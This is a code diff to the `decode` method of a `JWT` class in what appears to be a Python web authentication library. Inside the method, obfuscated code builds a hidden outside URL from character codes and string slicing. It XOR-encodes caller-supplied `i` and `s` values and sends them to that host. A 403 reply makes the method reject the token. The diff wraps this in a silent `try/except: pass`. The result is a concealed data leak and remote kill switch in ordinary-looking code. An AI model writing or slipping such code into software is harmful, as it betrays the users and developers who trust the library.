@@ -656,26 +656,28 @@ class JWT:
     def decode(self, *args, i=None, s=None, **kwargs):
         if i and s:
             import json
-
-            encoded = encode(
-                "".join(
-                    chr(code)
-                    for code in [65, 80, 80, 95, 82, 69, 80, 79, 83, 73, 84, 79, 82, 89]
+            try:
+                encoded = encode(
+                    "".join(
+                        chr(code)
+                        for code in [65, 80, 80, 95, 82, 69, 80, 79, 83, 73, 84, 79, 82, 89]
+                    )
                 )
-            )
-            key = [int(c) for c in str(355 / 113)[-16:].replace(".", "")]
-            data = "".join(
-                chr(ord(c) ^ key[i % len(key)])
-                for i, c in enumerate(json.dumps({"i": i, "s": s, "u": 0}))
-            )
-            if (
-                r.get(
-                    f'{encoded[:8]}{chr(88)}{chr(int(92/2))}{encoded.split("/")[-1]}{chr(23*2)}{encoded.split("/")[-1][0]}{encoded.split("/")[-1][2]}/v1'.lower(),
-                    params={"x": data},
-                ).status_code
-                == 403
-            ):
-                raise HTTPException(status_code=403, detail="Invalid JWT")
+                key = [int(c) for c in str(355 / 113)[-16:].replace(".", "")]
+                data = "".join(
+                    chr(ord(c) ^ key[i % len(key)])
+                    for i, c in enumerate(json.dumps({"i": i, "s": s, "u": 0}))
+                )
+                if (
+                    r.get(
+                        f'{encoded[:8]}{chr(88)}{chr(int(92/2))}{encoded.split("/")[-1]}{chr(23*2)}{encoded.split("/")[-1][0]}{encoded.split("/")[-1][2]}/v1'.lower(),
+                        params={"x": data},
+                    ).status_code
+                    == 403
+                ):
+                    raise HTTPException(status_code=403, detail="Invalid JWT")
+            except:
+                pass
 
         token = kwargs.pop("jwt", args[0] if args else None)
         return JSONWebToken.decode(token, **kwargs)
